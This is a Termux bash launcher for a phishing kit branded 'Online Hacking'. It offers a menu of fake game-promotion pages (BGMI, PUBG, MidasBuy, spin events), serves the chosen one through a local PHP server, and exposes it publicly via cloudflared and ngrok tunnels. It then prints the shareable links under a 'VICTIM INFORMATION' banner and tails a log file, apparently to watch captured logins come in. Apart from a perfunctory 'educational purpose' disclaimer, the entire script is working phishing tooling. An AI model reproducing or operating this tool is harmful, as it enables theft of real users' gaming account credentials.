#!/bin/bash
echo ""
## server
server() {
                           echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" \e[91m[\e[1;92m★\e[1;91m]\e[1;93m Turn On Mobile Hostpot ... \e[0m   "
			   sleep 4
			   echo ""
			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;96m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo -e $" \e[91m[\e[92m-\e[91m]\e[1;95m Start LocalHost... :  \e[0m http://127.0.0.1:4444 "
			   echo ""
			   sleep 2
			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok... : \e[0m Turn On Mobile Hostpot  "
			   echo ""
			   sleep 5

}


link_server() {
echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
			   echo -ne "  "
   		           if [[ `command -v termux-chroot` ]]; then
			  sleep 2 && termux-chroot ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   			  else
     		           sleep 2 && ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   	                 fi
			{ sleep 8; clear; }
				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
			   
			   echo ""
			   
			    echo -e $""
            echo -e "\e[96m========================\e[93m    SUMAN © 2022    \e[96m=========================\e[92m"
            echo ""
            echo -e "\e[34m
SUMAN ©\e[92m
   ____        ___               __  __           __   _            
  / __ \____  / (_)___  ___     / / / /___ ______/ /__(_)___  ____ _
 / / / / __ \/ / / __ \/ _ \   / /_/ / __ `/ ___/ //_/ / __ \/ __ `/
/ /_/ / / / / / / / / /  __/  / __  / /_/ / /__/ ,< / / / / / /_/ / 
\____/_/ /_/_/_/_/ /_/\___/  /_/ /_/\__,_/\___/_/|_/_/_/ /_/\__, /  
                                                           /____/  
            \e[m"
            echo ""
	    echo -e "\e[96m========================\e[93m WAIT FOR START \e[96m========================= \e[93m" 
            echo ""
            echo ""
	    clear
            echo ""   
			   
			   echo -e $" \e[91m[\e[0m Online HacKing\e[91m]\e[1;92m Wait for Start.....\e[0m  "
			   echo -ne ""
                           if [[ `command -v termux-chroot` ]]; then
                           sleep 1 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
                          else
                            sleep 1 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
                         fi
	                 { sleep 8; clear; }
	                       nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
			       echo ""
}




l_logo() {
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.xyz  \e[0m\n"
     echo ""  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"
     echo ""
echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
		           echo ""

}


links() {
                           echo -e "\e[96m=======================\e[92m    SUMAN © 2022    \e[96m=======================\e[92m"
                           echo -e " "
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Link Not Received Manually - Open New Tab Run This Command: "
			   echo ""
			   echo -e " \e[33m | \e[1;92m./cloudflared-linux-arm64 http 4444 \e[33m||\e[92m ./ngrok http 4444 \e[33m|"
			   echo ""
			   echo -e " "
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Localhost Link :\e[0m\e[1;77m %s\e[0m\n" http://127.0.0.1:4444/ 
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo ""
			   rm -rf cld.log
			   echo ""
			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                           echo ""
}

## Exit message
msg_exit() {
echo ""
echo -e "\e[91m[\e[92m+\e[91m] \e[92m Thank you for using this tool. Have a good day. \e[m "
echo ""
echo -e "\e[1m\e[36m[+] More Hacking Totorial Chack this Website :\e[93m www.onlinehacking.in \e[m "
echo ""
echo -e "\e[1m\e[95m[+] Join Telegarm Channel :\e[93m https://t.me/OnlineHacking \e[m "
echo ""
echo ""
}



clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
sleep 4
echo ""
clear
echo ""
printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
kill -9 $cloudflared-linux-arm64
clear
cd /data/data/com.termux/files/usr/bin/OnlineHacking/
bash Logo.sh
bash Logo2.sh
echo ""
                 echo -e $''   
                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
                 echo ""
		 echo ""
		 



		 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd /data/data/com.termux/files/usr/bin/.SUMAN
                           cd X-Suit/
			   echo ""
                           server
                           link_server
                           clear
                           l_logo
			   links
			   
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                           msg_exit


	          break;
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd Avalanche-X-Suit-LuckySpin/         
                           echo ""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                           msg_exit



                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd MidasBuy/
                           echo ""
                           server
                           link_server
                           clear
                           l_logo
			   links

                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt 
                           msg_exit
 
                  
                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
	         then
                           cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd SPIN-EVENT/   
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                  
               
	       
	       
                  
                break;
                elif [ $option = 05 ] || [ $option = 5 ]
	        then 
                           cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd Collect-Car-event/
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                  
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
	         then
                
                           cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd BGMI_4_Anniversarry/
			   echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt 
                  
                break;
   elif [ $option = 07 ] || [ $option = 7 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd PUBG-4-Anniversarry/         
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;
    elif [ $option = 08 ] || [ $option = 8 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd PUBG-RP-M9/         
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

                  break;   
		  
elif [ $option = 09 ] || [ $option = 9 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd BGMI-Collect-M416/         
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;		  
elif [ $option = 10 ] || [ $option = 010 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/.SUMAN/
                           cd BGMI-Car-Event/     
                           echo ""
                           echo""
                           server
                           link_server
                           clear
                           l_logo
			   links
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

                  break;		  
elif [ $option = 50 ] || [ $option = 050 ]
	          then

                           echo ""
			   echo ""
	         

                 echo ""
	
	
			   

                  break;		  

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
